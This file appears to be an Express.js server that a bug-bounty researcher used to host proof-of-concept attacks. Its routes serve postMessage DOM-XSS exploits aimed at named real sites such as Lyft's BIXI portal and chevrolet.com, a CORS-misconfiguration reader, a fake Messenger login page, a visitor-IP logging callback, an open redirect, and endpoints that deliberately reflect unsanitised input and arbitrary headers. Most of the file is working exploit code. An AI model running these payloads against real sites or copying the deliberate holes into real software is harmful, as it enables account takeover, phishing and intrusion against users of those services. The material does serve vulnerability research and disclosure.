const express = require("express");
const app = express();
const path = require("path");
const fs = require("fs");
const writer = fs.createWriteStream("log.txt");


app.use(express.static("public"));

app.get("/fakeLoginMessenger", function (req, res) {
  res.sendFile(path.join(__dirname, "Messenger.html"));
});

app.get("/poc", function (req, res) {
  res.sendFile(path.join(__dirname, "poc.html"));
});

app.get("/CORSMisconfigurationCodeWithChrome", function (req, res) {
   res.send(`<iframe src="data:text/html,<script>fetch('http://127.0.0.1:8090').then(a=>a.text()).then(content=>{console.log(content);alert(content)})</script>">`);
});

app.get("/LyftPostMessageDOMXSS", function (req, res) {
   res.send(`<script>let wintabxss = open("https://biximontreal.lyft.net/sign-in?next=http%3A%2F%2Fbiximontreal.lyft.net%2Fprofile");
setInterval(()=>{
wintabxss.postMessage([{"reportingName":"\u003Cimg src=x onerror=alert(origin)\u003E","eventName":"c7cd1703_97fb_4e7d_9f20_f4f5f49a72d1","advertiserId":"68792028f297354dce5713ef","campaignId":"68792028f297354dce5713ef"}],"*")
},1000)</script>`);
});

app.get("/chevroletXSS", function (req, res) {
   res.send(`<script>
   let tab = open("https://www.chevrolet.com");
   setInterval(()=>{
   tab.postMessage(\`{"nonMP":"xsss","siteurl":"https://missoumsaid.com/test?input=alert(origin);////","lang":"xsss","country":"xsss","currency":"xsss","action":"xsss","value":"xsss","source":"xsss"}\`,"*")},1);
   </script>`);
});


    
app.get("/blind", function (req, res) {
  const forwarded = req.headers["x-forwarded-for"];
  const ip = req.ip;
  writer.write(`x-forwarded-for:${forwarded}; ip: ${ip}`);
  res.send("Logged");
});

app.get("/log", function (req, res) {
  res.sendFile(path.join(__dirname, "log.txt"));
});

app.get("/ads.txt", function (req, res) {
  res.set('Content-Type', 'text/javascript');
  res.send('alert(origin);');
});




app.get("/redirect", function (req, res) {
  res.redirect(req.query.url);
 
  
});

  app.get("/WNBAPostMessageDOMXSS", function (req, res) {
  res.sendFile(path.join(__dirname, "WNBAPostMessageDOMXSS.html"));
});

  
app.get("/xssme", function (req, res) {
  res.sendFile(path.join(__dirname, "xss.html"));
});

app.get("/", function (req, res) {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/tensor.bytes", function (req, res) {
  res.set("Access-Control-Allow-Origin", "*");
  res.send(`
  <html>
  <head>

<script>window.addEventListener("message", a=> console.log( '%c Caught event:', 'background: #222; color: #bada55', a))</script></head>
  <body style="background-color:white;">
${req.query.input}
</body></html>`);
});

app.get("/tsv", function (req, res) {
  res.set("Access-Control-Allow-Origin", "*");
  res.set("Content-type", "text/tab-separated-values");
  res.send(`-'alert(1)-'ter	Other parameter	Last parameter
  <-'alert(1)-'>	123456	12.45`);
});

app.get("/buffer", function (req, res) {

  data = req.query.data
  let buffer = new ArrayBuffer(data.length / 2);
  let int8View = new Int8Array(buffer);
  for (let i = 0; i < data.length; i++) {
    int8View[i] = data.slice(i * 2, (i * 2) + 2)
  }
  res.set('Content-Length', buffer.byteLength);
  
  res.set('Content-Disposition', 'inline');

  buffer = Buffer.from(buffer);

  res.send(buffer)
});



app.get("/codeWithChromeXSS", function (req, res) {


  res.send(`<script>let x = window.open('http://127.0.0.1:8090/preview/untitled_phaser_blockly_file.html');window.addEventListener("message", a=> {  x.postMessage({name: "__exec__", value:"alert(origin)"}, "*");});setTimeout(()=> x.postMessage({name: "__handshake__", value:"1307"}, "*"), 500)</script>`);
});

app.get("/test", function (req, res) {
  const headers = req.query.header ? JSON.parse(req.query.header) : [] ;
  for (const header in headers) {
    res.set(header, headers[header]);
  }

  res.send(req.query.input);
});

app.get("/google-accounts-xss.html", function (req, res) {
  res.sendFile(path.join(__dirname, "google-accounts-xss.html"));
});

app.get("/google-csrfs.html", function (req, res) {
  res.sendFile(path.join(__dirname, "google-csrfs.html"));
});

app.get("/googlebugs.html", function (req, res) {
  res.sendFile(path.join(__dirname, "googlebugs.html"));
});

app.listen(3003);
